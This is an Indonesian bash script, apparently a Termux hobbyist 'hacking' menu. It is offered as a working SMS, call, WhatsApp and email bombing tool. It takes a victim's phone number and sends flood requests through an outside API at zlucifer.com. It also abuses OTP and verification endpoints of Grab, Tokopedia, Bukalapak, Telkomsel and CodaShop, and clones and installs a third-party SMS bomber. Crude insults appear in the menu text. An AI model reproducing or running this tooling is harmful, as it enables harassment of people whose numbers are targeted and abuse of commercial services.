#!/system/xbin/bash
#INDONESIA CYBER
#This DICK Mwehehe 
#            ____   _____
#          / [ • ]  | |  [ • ] \
#         |  \     ___      /  |
#         |    \_______/    |
#         |                        |
#        /                        \
#       \_______/\_____/
clear
echo "\033[31;1m [★]================================================[★]"
echo "\033[32;1m [-] Kang ReCode    : Dr.Zi20               [-]"
echo "\033[36;1m [★]Team     : Nub 5ec Cyber                      [★]"
echo "\033[32;1m [-]Version  : 0.0                                  [-]"
echo "\033[31;1m [★]================================================[★]"
sleep 2
echo "\033[36;1m WAIT.."
sleep 1
echo "\033[36;1m WAIT...."
sleep 1
echo "MENGAMBIL IP......"
sleep 2
echo "\033[32;1m Done......."
sleep 1
echo "\033[36;1m
1. Zi20 Project
2. Ayy Project
3. Kii Project
4.Info Script"
echo "\033[31;1m 5. Out?"
 sleep 1
 echo "\033[33;1m Pilih Nomor"
 read -p "[?] Pilih Nying > " p
 
 if [ $p = 5 ]
 then
 clear
 toilet -f mono12 -F gay "BYE"
 sleep 3
 echo "Ayy Kii and Zi20 Mengucapkan"
 sleep 2
 echo "\033[35;1m Terima Kasih"
 sleep 0.30
 echo "See u later"
 exit
 fi

 if [ $p = 1 ]
 then
 clear
 troll(){
    clear
    echo " ============================="
    sleep 2
    echo " ==      Zizo Project      =="
    sleep 0.7
    echo " ============================="
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
get_sms=$(curl -s http://zlucifer.com/api/hackbae.php?request=sms)
get_call=$(curl -s http://zlucifer.com/api/hackbae.php?request=call)
mulai (){
    echo "Gunakan Zi20 Project Lagi?"
    echo "y/n?"
    echo
    read lagi
    if [ $lagi = "y" ]; then
            spam
    else
            echo "Terimakasih sudah menggunakan Zi20 project"
    fi
}
#spam
spam(){
    clear
    troll
    echo
    echo "[1] Spam SMS"
    echo "[2] Spam Telp"
    echo "[3] Close Zi20 Project"
    echo
    echo "1/2/3?"
    read pilih
    if [ $pilih = "1" ]; then
            echo "Troll Spam SMS"
            #function spam
            echo
            echo "Silahkan masukan nomor telp target"
            echo contoh 081222203820
            read target # masukin no telp
            echo
            echo "Berapa sms yang mau dikirim?"
            read paket
            echo
            echo Apakah nomor $target "dan SMS dikirim "$paket" sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                    load
                    clear
                    echo Melakukan spam SMS ke nomor $target
                    echo
                    echo "Jangan close aplikasi sebelum spam selesai"
                    echo "========================================"
                    target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
                    echo " Gunakan tools dengan bijak"
                    echo
                    echo " Love u always "
                    echo " Nub5ecCo "
                    echo "======================================="
            else
                    echo "Kesalahan"
            fi
        mulai
    elif [ $pilih = "2" ]; then
            echo "Troll Spam Call"
            #function spam
            echo
            echo "Silahkan masukan nomor telp target"
            echo contoh 0812345678
            read target # masukin no telp
            echo
            echo "Gunakan API Grab/Toped?"
            echo "[1] GRAB"
            echo "[2] TOPED"
            echo "1/2?"
            read api
            if [ $api = "1" ]; then
                  api_spam="grab"
            else
                  api_spam="toped"
            fi
            echo Apakah nomor $target dan spam menggunakan $api_spam "sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                  load
                  clear
                  echo Melakukan spam call ke nomor $target
                  echo
                  echo "Jangan close aplikasi sebelum spam selesai"
                  echo "========================================"
                  cek_target=`curl -s $get_call/call.php?nomor=$target"&method="$api_spam`
                  echo -e $cek_target
                  echo " Gunakan tools dengan bijak"
                  echo
                  echo " Love u always "
                  echo " Nub5ecCo "
                  echo "========================================"
            else
                  echo Kesalahan, silahkan coba lagi
            fi
        mulai
    elif [ $pilih = "3" ]; then
        echo "Terimakasih sudah menggunakan Troll project"
        sh segalaScript.sh
    else
        clear
        echo "Kesalahan"
        mulai
    fi
}
close(){
    exit
}
clear
echo "Loading.."
load
clear
troll
echo Selamat datang kak, Siapa nick kaka? #tulisan keluar
read nick #membaca yang ditulis
clear
troll
echo Selamat datang $nick ":)"
echo
echo "Mulai zizo project?"
echo "y/n?"
read mulai
if [ $mulai = "y" ]; then
      spam
else
      close
fi
sh segalaScript.sh
fi
 
 if [ $p = 2 ]
 then
 echo "033[33;1m Welcome To Ayy Project"
 sleep 2
 echo "033[32;1m Script ini berisi Litespam"
 sleep 2
 echo "Menuju Script"
 sleep 1
 echo "3"
 sleep 1
 echo "2"
 sleep 1
 echo "1"
 echo "OTW"
 sleep 1
 clear
 fi
git clone https://github.com/amsitlab/smsid-java.git
cd ./smsid-java
chmod +x ./install
apt install ./smsid_1.1_all.deb
clear

toilet -f slant --gay "LiteSpam"
sleep 1
echo "\033[33;1m Macam-macam tool untuk spam"
sleep 1
echo "\033[36;1m★""\033[34;1mIndonesia Security Lite""\033[36;1m★"
sleep 1
echo "\033[32;1m Spam Yang Tersedia :"
echo "\033[35;1m1.""\033[36;1mBukalapak"
echo "\033[35;1m2.""\033[36;1mTelkomsel"
echo "\033[35;1m3.""\033[36;1mGrab"
echo "\033[35;1m4.""\033[36;1mTokopedia"
echo "\033[35;1m5.""\033[36;1mCodaShop"
echo "\033[35;1m6.""\033[36;1mSurveyon"
echo "\033[35;1m7.""\033[36;1mCustom"
echo "\033[31;1m0. Keluar"
echo "\033[37;1m81.""\033[30;1mInformasi Tool Ini"
echo "\033[33;1m Pilih Angka:"
read mrrm

if [ $mrrm = 1 ] || [ $mrrm = 1 ]
then
clear
toilet -f slant "Bukalapak"
echo "\033[31;1mJenis Spam:""\033[37;1mChat WhatsApp"
echo "\033[31;1mBatas:""\033[37;1mUnlimited"
echo "\033[31;1mPemograman:""\033[37;1mPHP"
echo "\033[31;1mAuthor:""\033[37;1mSGB-Team"
sleep 5
clear
cd $HOME/LITESPAM/Tul/
php 1
fi

if [ $mrrm = 2 ] || [ $mrrm = 2 ]
then
clear
echo "\033[31;1m"
toilet "T-Sel"
echo "\033[31;1mJenis Spam:""\033[37;1mSMS"
echo "\033[31;1mBatas:""\033[37;1mUnlimited"
echo "\033[31;1mPemograman:""\033[37;1mPHP"
echo "\033[31;1mAuthor:""\033[37;1mDanz"
sleep 5
clear
cd $HOME/LITESPAM/Tul/
php 2.php
fi

if [ $mrrm = 3 ] || [ $mrrm = 3 ]
then
clear
echo "\033[36;1m"
figlet "Grab"
echo "\033[31;1mJenis Spam:""\033[37;1mTelepon"
echo "\033[31;1mBatas:""\033[37;1mUnlimited"
echo "\033[31;1mPemograman:""\033[37;1mPHP"
echo "\033[31;1mAuthor:""\033[37;1mRaja Adtiya Candra"
sleep 5
clear
cd $HOME/LITESPAM/Tul/
php 3.php
fi


if [ $mrrm = 4 ] || [ $mrrm = 4 ]
then
clear
toilet -f mono9 -F gay "Toked"
echo "\033[31;1mJenis Spam:""\033[37;1mTelepon"
echo "\033[31;1mBatas:""\033[37;1m1 Kali"
echo "\033[31;1mPemograman:""\033[37;1mPHP"
echo "\033[31;1mAuthor:""\033[37;1mSGB-Team"
sleep 5
clear
cd $HOME/LITESPAM/Tul/
php 4.php
fi

if [ $mrrm = 5 ] || [ $mrrm = 5 ]
then
clear
toilet -f slant -F gay "CodaShop"
echo "\033[31;1mJenis Spam:""\033[37;1mSMS"
echo "\033[31;1mBatas:""\033[37;1mUnlimited"
echo "\033[31;1mPemograman:""\033[37;1mPHP"
echo "\033[31;1mAuthor:""\033[37;1mBullyHat"
echo
echo
echo "\033[33;1mCOPY LISENSI INI:" "\033[36;1mJDJ5JDEwJC9YMWRvNC5jcmNOSUw2dGdUaUt2d08ucWEvWURWSFNCTXI3U21wdkdsR1FMcVBSTW1oNUZH"
sleep 1
echo "\033[32;1mtunggu 5 Detik"
sleep 5
clear
cd $HOME/LITESPAM/Tul/
php 5.php
fi

if [ $mrrm = 6 ] || [ $mrrm = 6 ]
then
clear
toilet -f standard -F gay "Surveyon "
echo "\033[31;1mJenis Spam:""\033[37;1mEmail"
echo "\033[31;1mBatas:""\033[37;1mUnlimited"
echo "\033[31;1mPemograman:""\033[37;1mphp"
echo "\033[31;1mAuthor:""\033[37;1mChandra Aditya"
sleep 5
cd $HOME/LITESPAM/Tul/
php 6.php
fi

if [ $mrrm = 7 ] || [ $mrrm = 7 ]
then
clear
toilet -f slant --gay "SMSID"
echo "\033[31;1mJenis Spam:""\033[37;1mSMS"
echo "\033[31;1mBatas:""\033[37;1m5"
echo "\033[31;1mPemograman:""\033[37;1mBerjalan Langsung Pada DalvikVM"
echo "\033[31;1mAuthor:""\033[37;1mAmsitlab"
echo
echo
echo "\033[33;1mInformasi Lebih Lanjut Kunjungi:""\033[36;1mhttps://amsitlab.github.io/smsid-java/"
sleep 6
smsid boom -y
fi

if [ $mrrm = 81 ] || [ $mrrm = 81 ]
then
clear
toilet -f slant --gay "LiteSpam"
echo "\033[34;1mContact:""\033[37;1m https://fb.me/IrsyadMaulana81"


sleep 1
echo "\033[35;1mPemograman:""\033[36;1m Bash"

echo "\033[33;1mKarya: IM81"
sleep 1
echo "\033[32;1mVersi: v3"
sleep 1
echo "\033[36;1mTeam: Indonesia Security Lite"
sleep 1
echo "\033[31;1mSubscribe YouTube""\033[37;1m HeXeRz"
echo "\033[35;1m Spesial Thanks To: "
echo "\033[36;1m"
echo "Danz"
echo "Mr.Rm"
echo "SBGTeam"
echo "amsitlab"
echo "Bully Hat"
echo "ChandraAditya"
echo "Secoly Indonesia"
echo "BlackHole Security"
echo "Association Indonesian Right Wings"
sleep 1
echo "And All Member Indonesia Security Lite"
echo "\033[30;1m tunggu 8 detik"
sleep 8
sh segalaScript.sh
fi



if [ $mrrm = 0 ] || [ $mrrm = 0 ]
then
echo "\033[31;1m Keluar"
sleep 1
echo "\033[32;1m Sampai berjumpa lagi :)"
sleep 1
fi

if [ $p = 3 ]
then
clear 
echo "SCRIPT KII PROJECT"
echo "COMING SOON...."
sleep 3
sh segalaScript.sh
fi

if [ $p = 4 ]
then
clear
echo "COMING SOON..."
sleep 2
sh segalaScript.sh
fi

 if [ $p = 6 ]
 then
 clear
echo "\033[31;1m KESALAHAN!!!"
sleep 3
echo "akan dikembalikan keMainMenu"
sleep 1
echo "dalam"
sleep 1
echo "3"
sleep 1
echo "2"
sleep 1
echo "1"
sleep 1
sh segalaScript.sh
fi

if [ $p = 7 ]
then 
echo "HEHE"
sleep 2
echo "\033[31;1m KNTL PILIH YANG ADA DITOOLSNYA"
sleep 1 
echo "3"
sleep 1
echo "2"
sleep 1
echo "1"
sleep 1
sh segalaScript.sh
fi
